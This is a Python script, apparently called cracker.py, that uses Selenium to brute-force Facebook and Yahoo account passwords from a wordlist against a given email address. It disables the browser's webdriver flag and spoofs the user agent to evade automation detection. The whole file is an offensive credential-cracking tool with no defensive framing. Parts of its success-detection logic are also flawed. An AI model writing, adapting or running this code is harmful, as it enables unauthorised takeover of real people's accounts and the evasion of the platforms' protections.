from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.keys import Keys
import threading
import time
import sys

found = False

def facebook_cracker(email, password):
    global found
    print("Trying: " + password, end="")
    driver = create_driver()
    try:
        driver.get("https://www.facebook.com/login/")
        WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')

        elem = driver.find_element_by_name("email")
        elem.clear()
        elem.send_keys(email)

        elem = driver.find_element_by_id("pass")
        elem.clear()
        elem.send_keys(password)
        elem.send_keys(Keys.RETURN)
    except:
        try:
            assert (("Log into Facebook | Facebook") in driver.title)
            driver.quit()
        except AssertionError:
            found = True
            print("Found password: " + password)






def yahoo_cracker(email, password):
    global found
    print("Trying: " + password, end="")
    driver = create_driver()
    driver.get("https://login.yahoo.com/")

    user = driver.find_element_by_id("login-username")
    user.send_keys(email)
    submit = driver.find_element_by_id("login-signin")
    submit.click()


    driver.implicitly_wait(1)
    passwd = driver.find_element_by_id("login-passwd")
    passwd.send_keys(password)


    driver.implicitly_wait(1)
    try:
        search = driver.find_element_by_id("header-desktop-search-button")
        found = True
        print("Found password: " + password)
    except:
        driver.quit()


def create_driver():
    options = webdriver.ChromeOptions()
    options.add_argument("start-maximized")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option('useAutomationExtension', False)



    driver = webdriver.Chrome(options=options, executable_path="chromedriver.exe")
    driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": """
        Object.defineProperty(navigator, 'webdriver', {
          get: () => undefined
        })
      """
    })
    driver.execute_cdp_cmd('Network.setUserAgentOverride', {
        "userAgent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.53 Safari/537.36'})
    return driver


def main():
    global found
    thread_list = []
    if len(sys.argv) < 4:
        print("Usage cracker.py service email passwordFile")
        return
    else:
        service = sys.argv[1]
        email = sys.argv[2]
        passfile = sys.argv[3]
        file = open(passfile)
        if service == "yahoo":
            print("Cracking Yahoo password for: " + email)
        elif service == "facebook":
            print("Cracking Facebook password for: " + email)
        for password in file:
            if service == "yahoo":
                yahoo_cracker(email,password)
            elif service == "facebook":
                facebook_cracker(email, password)
            time.sleep(5)
            if(found == True):
                while True:
                    time.sleep(1)

if __name__ == "__main__":
    main()